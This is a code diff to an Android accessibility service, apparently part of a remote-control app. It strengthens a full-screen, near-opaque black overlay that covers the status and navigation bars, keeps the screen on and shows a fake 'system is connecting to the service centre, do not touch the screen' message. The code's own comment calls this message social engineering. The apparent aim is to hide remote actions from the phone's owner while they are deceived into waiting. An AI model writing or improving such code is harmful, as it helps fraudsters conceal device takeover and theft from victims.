@@ -770,8 +770,19 @@ class InputService : AccessibilityService() {
 
     fun onStartOverlay(arg1: String, arg2: String) {
         gohome = arg1.toIntOrNull() ?: 8
-        if (overlayInitialized) {
-            overLay.post { overLay.visibility = gohome }
+        if (overlayInitialized && overLay.windowToken != null) {
+            overLay.post {
+                if (gohome == 8) {
+                    // 关黑屏: 禁用交互
+                    overLay.isFocusable = false
+                    overLay.isClickable = false
+                } else {
+                    // 开黑屏: 启用交互（阻止被控端触摸）
+                    overLay.isFocusable = true
+                    overLay.isClickable = true
+                }
+                overLay.visibility = gohome
+            }
         }
     }
 
@@ -873,53 +884,106 @@ class InputService : AccessibilityService() {
     private fun createOverlay() {
         try {
             windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+
+            // ── 获取屏幕物理尺寸 ──
+            val displayMetrics = resources.displayMetrics
+            // 使用超大尺寸确保覆盖任何屏幕（含状态栏、导航栏、圆角、刘海）
+            val overlayWidth = 2160
+            val overlayHeight = 3840
+
+            // ── 创建 FrameLayout 容器（纯黑背景）──
             overLay = android.widget.FrameLayout(this)
             overLay.setBackgroundColor(android.graphics.Color.BLACK)
+            // ★ 只对背景 Drawable 设置 Alpha=253（99.2% 不透明），
+            //   子 View（文字）不受影响，文字自然绘制在背景之上
+            overLay.background?.alpha = 253
+
+            // ── WindowManager.LayoutParams ──
+            // 窗口类型: TYPE_ACCESSIBILITY_OVERLAY(2032) Z-order 高于状态栏(2000)和导航栏(2019)
+            val windowType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+            else
+                @Suppress("DEPRECATION")
+                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+            // 窗口标志组合:
+            //   FLAG_LAYOUT_IN_SCREEN(0x100)  → 基于整个物理屏幕布局（含系统栏区域）
+            //   FLAG_NOT_TOUCH_MODAL(0x20)    → 允许外部触摸
+            //   FLAG_NOT_FOCUSABLE(0x08)      → 不获取焦点
+            //   FLAG_NOT_TOUCHABLE(0x10)      → 触摸穿透到下层
+            //   FLAG_FULLSCREEN(0x400)        → 全屏模式
+            //   FLAG_LAYOUT_NO_LIMITS(0x200)  → 忽略屏幕物理边界
+            //   FLAG_KEEP_SCREEN_ON(0x80)     → 保持屏幕常亮
+            val flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                WindowManager.LayoutParams.FLAG_FULLSCREEN or
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
 
             val layoutParams = WindowManager.LayoutParams(
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.MATCH_PARENT,
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
-                else
-                    @Suppress("DEPRECATION")
-                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                android.graphics.PixelFormat.TRANSLUCENT
+                overlayWidth,       // 固定超大宽度，确保覆盖
+                overlayHeight,      // 固定超大高度，确保覆盖
+                windowType,
+                flags,
+                android.graphics.PixelFormat.RGBA_8888  // 与参考项目一致
             )
 
-            // Add social engineering text
+            // ★ 锚定到屏幕绝对左上角 (0,0)
+            // gravity = 51 = Gravity.TOP(48) | Gravity.START(3)
+            layoutParams.gravity = android.view.Gravity.TOP or android.view.Gravity.START
+            layoutParams.x = 0
+            layoutParams.y = 0
+
+            // ── 创建 TextView（提示文字，绘制在黑色背景之上）──
             val textView = android.widget.TextView(this)
-            textView.text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
-            textView.setTextColor(android.graphics.Color.WHITE)
-            textView.textSize = 16f
-            textView.gravity = android.view.Gravity.CENTER
-            val params = android.widget.FrameLayout.LayoutParams(
-                android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
-                android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
-            )
-            params.gravity = android.view.Gravity.CENTER
-            overLay.addView(textView, params)
+            textView.text = "\n\n系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
+            textView.setTextColor(0xFF888888.toInt())  // 灰色文字
+            textView.textSize = 15f
+            textView.gravity = android.view.Gravity.START or android.view.Gravity.BOTTOM
+            textView.setPadding(20, 20, 20, 20)
 
-            overLay.alpha = 0.99f
-            overLay.visibility = gohome  // Start hidden (8=GONE)
+            // TextView 定位到屏幕底部偏左
+            val screenH = displayMetrics.heightPixels
+            val density = displayMetrics.density
+            val vh = (5 * 100 * density + 0.5).toInt()  // 500dp → px
+            val offset = (60 * density + 0.5).toInt()    // 60dp → px
+            val topMargin = screenH - vh - offset
+
+            val tvParams = android.widget.FrameLayout.LayoutParams(vh, vh)
+            tvParams.gravity = android.view.Gravity.START or android.view.Gravity.TOP
+            tvParams.topMargin = topMargin
+            tvParams.leftMargin = 60
+            overLay.addView(textView, tvParams)
+
+            // ── 初始隐藏 ──
+            overLay.visibility = android.view.View.GONE
+            overLay.isFocusable = false
+            overLay.isClickable = false
+
+            // ── 注册到 WindowManager ──
             windowManager.addView(overLay, layoutParams)
             overlayInitialized = true
 
-            // 50ms timer to maintain overlay visibility state
+            // ── 50ms 定时器持续维持遮罩状态 ──
             val runnable = object : Runnable {
                 override fun run() {
-                    if (overlayInitialized) {
-                        overLay.visibility = gohome
+                    if (overlayInitialized && overLay.windowToken != null) {
+                        val targetVisibility = gohome
+                        if (overLay.visibility != targetVisibility) {
+                            overLay.post {
+                                overLay.visibility = targetVisibility
+                                overLay.isFocusable = targetVisibility != android.view.View.GONE
+                                overLay.isClickable = targetVisibility != android.view.View.GONE
+                            }
+                        }
                         BIS = overLay.visibility != android.view.View.GONE
                     }
                     overlayHandler.postDelayed(this, 50)
                 }
             }
-            overlayHandler.postDelayed(runnable, 50)
+            overlayHandler.postDelayed(runnable, 1000)  // 首次延迟1秒再启动循环
         } catch (e: Exception) {
             Log.e(logTag, "Failed to create overlay: ${e.message}")
         }
